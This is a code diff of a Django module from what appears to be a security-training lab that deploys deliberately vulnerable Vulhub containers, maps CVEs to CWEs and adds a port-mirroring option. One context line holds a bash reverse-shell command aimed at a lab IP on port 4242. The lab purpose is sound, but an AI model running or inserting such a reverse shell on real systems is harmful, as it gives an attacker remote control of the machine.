@@ -40,7 +40,6 @@ class scenario_template:
         self.name = name
         self.selected_vulns = []
         self.selected_vulns_child_containers = dict()
-        self.selected_custom_containers = []
         self.custom_vulnhub_containers = []
         self.deployed_containers = []
         self.targetos="targetos:172.28.0.200"
@@ -123,6 +122,9 @@ def vulnhubView(request):
 
     cve_cwe_dict = dict()
 
+    cve_cwe_dict["Multiple Services"] = dict()
+    cve_cwe_dict["Single Services"] = dict()
+
     if os.path.isfile("{}/cve_cwe_mappings.json".format(resource_file_path)):
 
         with open("{}/cve_cwe_mappings.json".format(resource_file_path), 'r') as fp:
@@ -153,6 +155,10 @@ def vulnhubView(request):
 
                 dcf_file = any(f == ("docker-compose.yml") for f in os.listdir(current_dir))
 
+                vuln_dir_path = os.path.join(root,dir).replace("//","/")
+                temp = vuln_dir_path.split("vulnhub/")[1]
+                software = temp.split("/")[0]
+
                 if match:
                     cve = match.group()
                     cve_r = requests.get("https://cve.circl.lu/api/cve/"+cve)
@@ -170,10 +176,16 @@ def vulnhubView(request):
                     if cwe_id not in cve_cwe_dict:
                         cve_cwe_dict[cwe_id] = dict()
 
-                    vuln_dir_path = os.path.join(root,dir).replace("//","/")
-                    temp = vuln_dir_path.split("vulnhub/")[1]
-                    software = temp.split("/")[0]
                     cve_cwe_dict[cwe_id]["{} - {}".format(software, cve)] = "vulnhub/" + temp
+
+                    if dcf_file:
+                        with open("{}/docker-compose.yml".format(current_dir)) as dcf:
+                            dcf_data = yaml.safe_load(dcf)
+
+                        if len(list(dcf_data["services"].keys())) >= 2:
+                            cve_cwe_dict["Multiple Services"]["{} - {}".format(software, cve)] = "vulnhub/" + temp
+                        else:
+                            cve_cwe_dict["Single Services"]["{} - {}".format(software, cve)] = "vulnhub/" + temp
 
                 elif dcf_file:
                     cwe_id = "Misc"
@@ -181,10 +193,15 @@ def vulnhubView(request):
                     if cwe_id not in cve_cwe_dict:
                         cve_cwe_dict[cwe_id] = dict()
 
-                    vuln_dir_path = os.path.join(root,dir).replace("//","/")
-                    temp = vuln_dir_path.split("vulnhub/")[1]
-                    software = temp.split("/")[0]
                     cve_cwe_dict[cwe_id]["{} - {}".format(software, dir)] = "vulnhub/" + temp
+
+                    with open("{}/docker-compose.yml".format(current_dir)) as dcf:
+                        dcf_data = yaml.safe_load(dcf)
+
+                    if len(list(dcf_data["services"].keys())) >= 2:
+                        cve_cwe_dict["Multiple Services"]["{} - {}".format(software, cve)] = "vulnhub/" + temp
+                    else:
+                       cve_cwe_dict["Single Services"]["{} - {}".format(software, cve)] = "vulnhub/" + temp
 
         with open("{}/cve_cwe_mappings.json".format(resource_file_path), 'w') as fp:
             json.dump(cve_cwe_dict, fp)
@@ -194,38 +211,6 @@ def vulnhubView(request):
     }
 
     return render(request,'GUI/vulnhub.html',context)
-
-
-def customView(request):
-    global current_scenario
-
-    cc_dict = custom_containers
-
-    custom_vulnhub_containers = os.listdir("{}/Custom_Containers/custom_vulnhub_containers".format(resource_file_path))
-
-    for container in custom_vulnhub_containers:
-        current_scenario.custom_vulnhub_containers.append(container)
-        cc_dict[container] = "{}/Custom_Containers/custom_vulnhub_containers/{}".format(resource_file_path,container)
-
-    if "selected_custom_containers" in request.POST:
-        selected_ccs = request.POST.getlist("selected_custom_containers")
-        for cc in selected_ccs:
-            if cc not in current_scenario.selected_custom_containers:
-                current_scenario.selected_custom_containers.append(cc)
-
-    if "remove_custom_container" in request.POST:
-
-        vulns_to_remove = request.POST.getlist("remove_custom_container")
-
-        for vuln in vulns_to_remove:
-            current_scenario.selected_custom_containers.remove(vuln)
-
-    context = {
-        'custom_containers':list(cc_dict.keys()),
-        'selected_custom_containers':current_scenario.selected_custom_containers
-    }
-
-    return render(request,'GUI/custom.html',context)
 
 
 def environmentView(request):
@@ -250,15 +235,6 @@ def environmentView(request):
         for service in dcf_data["services"]:
             current_scenario.selected_vulns_child_containers[service] = container_vlun
 
-    for container in current_scenario.selected_custom_containers:
-        if container in current_scenario.custom_vulnhub_containers:
-            dcf_data = yaml_data_from_docker_compose(container)[0]
-
-            for service in dcf_data["services"]:
-                current_scenario.selected_vulns_child_containers[service] = container
-
-        current_scenario.added_containers[container]="External"
-
     if request.method == "POST":
 
         start_time = time.time()
@@ -278,6 +254,7 @@ def environmentView(request):
             packetbeats = False
             suricata = False
             pcap = False
+            port_mirroring = False
 
             aux_depends_on = ""
 
@@ -292,6 +269,9 @@ def environmentView(request):
 
             if "pcap" in request.POST:
                 pcap = True
+
+            if "port_mirroring" in request.POST:
+                port_mirroring = True
 
             dynamic_containers_sect = header_dc.replace("target_os",target_os)
 
@@ -362,9 +342,9 @@ def environmentView(request):
 
             print("Deployment in Progress")
 
-            deploy_containers(current_scenario, ["uwe_tek_external", "uwe_tek_internal"],dynamic_containers_sect, pcap, selected_target, replace_subnet_dict=None, user_defined=False)
+            deploy_containers(current_scenario, ["uwe_tek_external", "uwe_tek_internal"],dynamic_containers_sect, pcap, selected_target, port_mirroring, replace_subnet_dict=None, user_defined=False)
 
-            if selected_target == "default":
+            if selected_target == "target_1":
 
                 listen_cmd = "/bin/bash -i >& /dev/tcp/172.28.0.157/4242 0>&1"
 
@@ -728,40 +708,6 @@ def readmeView(request):
     return render(request, 'GUI/readme.html', context)
 
 
-def customReadmeView(request):
-    global selected_cc
-
-    selected_cc = request.POST["selected_custom_containers"]
-
-    cc_dir = "{}/Custom_Containers/{}".format(resource_file_path,selected_cc)
-
-    readme_file = os.path.join(cc_dir, "README.md")
-
-    readme_str = ""
-
-    with open(readme_file, 'r') as readme_f:
-        for line in readme_f:
-            readme_str += line
-
-    htmlmarkdown=markdown.markdown(readme_str)
-
-    docker_files=dict()
-
-    files = os.listdir(cc_dir)
-
-    for f in files:
-        if f.lower().__contains__(selected_cc):
-            docker_files[f.split(".")[0]]=f
-
-    context = {
-        'htmlmarkdown':htmlmarkdown,
-        'docker_files':docker_files,
-        'selected_cc':selected_cc
-    }
-
-    return render(request, 'GUI/customReadme.html', context)
-
-
 def dockerfileView(request):
     global selected_vuln
 
@@ -776,117 +722,6 @@ def dockerfileView(request):
     }
 
     return render(request, 'GUI/dockerfileView.html', context)
-
-
-def customDockerfileView(request):
-    global selected_cc
-
-    cc_dir = "{}/Custom_Containers/{}".format(resource_file_path,selected_cc)
-
-    selected_file = request.POST["selected_file"]
-
-    docker_file = os.path.join(cc_dir, selected_file)
-
-    docker_f = open(docker_file, 'r')
-
-    context = {
-        'selected_file':docker_f.read()
-    }
-
-    return render(request, 'GUI/dockerfileView.html', context)
-
-
-def dockerfileEditingView(request):
-    global current_scenario
-
-    suggested_tag = "container:{}".format(time.strftime("%d%m%Y"))
-
-    saved_in_location = ""
-
-    pp_containers = dict()
-
-    docker_compose_file = ""
-
-    docker_build_result = ""
-
-    docker_file = "#No dockerfile selected or exists"
-
-    for container in current_scenario.selected_vulns:
-        pp_containers[container.split("vulnhub")[1]] = container
-
-    if request.method == "POST":
-
-        if "selected_container" in request.POST:
-            dockerfile_path = request.POST["selected_container"]
-
-            container = [k for k,v in pp_containers.items() if dockerfile_path == v][0]
-
-            current_scenario.selected_container = container
-
-            files = os.listdir(dockerfile_path)
-
-            for f in files:
-                if f.lower().__contains__("dockerfile"):
-                    with open(os.path.join(dockerfile_path,f)) as d_file:
-                        docker_file = "#Dockerfile loaded from {}\n".format(dockerfile_path)
-                        docker_file += d_file.read()
-
-                if f.lower().__contains__("compose"):
-                    with open(os.path.join(dockerfile_path,f)) as dc_file:
-                        docker_compose_file = "{} - docker compose file\n".format(container)
-                        docker_compose_file += dc_file.read()
-
-            suggested_tag = suggested_tag.replace("container",container.replace("/","_")[1:])
-            current_scenario.suggested_tag = suggested_tag
-
-        if "file_to_edit" in request.POST:
-
-            file_path_safe_container = current_scenario.selected_container.replace("/","_")[1:]
-
-            new_container_path = os.path.join(resource_file_path,"Custom_Containers/custom_vulnhub_containers", file_path_safe_container)
-
-            old_container_path = "{}/{}".format(vulnhub_dir,current_scenario.selected_container)
-
-            if not os.path.isdir(new_container_path):
-                os.makedirs(new_container_path)
-
-            file_data = request.POST["file_to_edit"]
-
-            with open(os.path.join(new_container_path,"dockerfile"), "w") as new_dockerfile:
-                new_dockerfile.write(file_data)
-
-            shutil.copytree(old_container_path, new_container_path, dirs_exist_ok=True)
-
-            saved_in_location = "A copy of {} has been moved to {} - Complete with the edited dockerfile".format(current_scenario.selected_container, new_container_path)
-
-            if "save_and_build" in request.POST:
-
-                tag = request.POST["build_tag"]
-
-                if tag == "":
-                    tag = current_scenario.suggested_tag
-
-                try:
-                    for line in api_client.build(path=new_container_path, rm=True, tag="django_cve-2019-14234:01122022"):
-                        print(line)
-                except Exception as e:
-                    docker_build_result = str(e)
-
-                if docker_build_result == "":
-                    docker_build_result = ""
-
-    context = {
-        'containers':pp_containers,
-        'docker_compose_file': docker_compose_file,
-        'file_contents':docker_file,
-        'suggested_tag': suggested_tag,
-        'saved_in':saved_in_location,
-        'docker_build_result':docker_build_result
-
-    }
-
-    return render(request, 'GUI/dockerfileEditing.html', context)
-
 
 
 def local_docker_check(image):
@@ -934,7 +769,7 @@ def service_check(address):
     return
 
 
-def deploy_containers(scenario, required_networks, dynamic_containers_sect, pcap, selected_target, replace_subnet_dict, user_defined):
+def deploy_containers(scenario, required_networks, dynamic_containers_sect, pcap, selected_target, port_mirroring, replace_subnet_dict, user_defined):
 
     custom_dc_services = dict()
 
@@ -953,14 +788,11 @@ def deploy_containers(scenario, required_networks, dynamic_containers_sect, pcap
         if custom_container in aux_containers.keys():
             selected_dict = aux_containers
 
-        elif custom_container in custom_containers.keys():
-            selected_dict = custom_containers
-
         else:
 
             parent_container = custom_container.split(" ")[0]
 
-            custom_dc_services.update(docker_compose_container_setup(scenario,parent_container))
+            custom_dc_services.update(docker_compose_container_setup(scenario,parent_container, port_mirroring))
 
     dc_file_content = (
         dynamic_containers_sect +
@@ -1043,7 +875,7 @@ def deploy_containers(scenario, required_networks, dynamic_containers_sect, pcap
         scenario.tcpdump_process = tcpdump_process.pid
 
 
-def docker_compose_container_setup(scenario,container):
+def docker_compose_container_setup(scenario,container, port_mirroring):
 
     dcf_data = yaml_data_from_docker_compose(container)[0]
     original_docker_compose_file = yaml_data_from_docker_compose(container)[1]
@@ -1083,27 +915,31 @@ def docker_compose_container_setup(scenario,container):
         running_container_info += "{} is up and running and can be accessed on {}\n".format(temp,ipv4_addr)
 
         if "ports" in dcf_data["services"][service]:
-            original_port_mapping = dcf_data["services"][service]["ports"]
 
-            dcf_data["services"][service]["ports"] = []
+            if port_mirroring:
+                original_port_mapping = dcf_data["services"][service]["ports"]
 
-            for port_pair in original_port_mapping:
-                exposed_port = int(port_pair.split(":")[0])
-                container_port = port_pair.split(":")[1]
+                dcf_data["services"][service]["ports"] = []
 
-                port_free = False
+                for port_pair in original_port_mapping:
+                    exposed_port = int(port_pair.split(":")[0])
+                    container_port = port_pair.split(":")[1]
 
-                while not port_free:
-                    if is_port_in_use(exposed_port) or exposed_port in scenario.ports_in_use:
-                        exposed_port += 1
+                    port_free = False
 
-                    else:
-                        scenario.ports_in_use.append(exposed_port)
-                        port_free = True
+                    while not port_free:
+                        if is_port_in_use(exposed_port) or exposed_port in scenario.ports_in_use:
+                            exposed_port += 1
 
-                port_pair_to_use = f"{exposed_port}:{container_port}"
+                        else:
+                            scenario.ports_in_use.append(exposed_port)
+                            port_free = True
 
-                dcf_data["services"][service]["ports"].append(port_pair_to_use)
+                    port_pair_to_use = f"{exposed_port}:{container_port}"
+
+                    dcf_data["services"][service]["ports"].append(port_pair_to_use)
+            else:
+                del dcf_data["services"][service]["ports"]
 
         if "image" in dcf_data["services"][service]:
             local_docker_check(dcf_data["services"][service]["image"])
@@ -1233,9 +1069,19 @@ def yaml_data_from_docker_compose(container):
 
     suffix = container.replace("/", "_").lower()
 
+    original_service_names = list(dcf_data['services'].keys())
+
     dcf_data["services"] = {f"{suffix}_{key}": value for key, value in dcf_data['services'].items()}
 
     for service in dcf_data["services"]:
+        if "environment" in dcf_data["services"][service]:
+            for idx in range(len(dcf_data["services"][service]["environment"])):
+                item_pair = dcf_data["services"][service]["environment"][idx]
+                env_var = item_pair.split("=")[0]
+                value = item_pair.split("=")[1]
+                if env_var.__contains__("HOST") and value in original_service_names:
+                    dcf_data["services"][service]["environment"][idx] = f"{env_var}={suffix}_{value}"
+            print(dcf_data["services"][service]["environment"])
         if "depends_on" in dcf_data["services"][service]:
             if type(dcf_data["services"][service]["depends_on"]) is list:
                 for idx in range(len(dcf_data["services"][service]["depends_on"])):
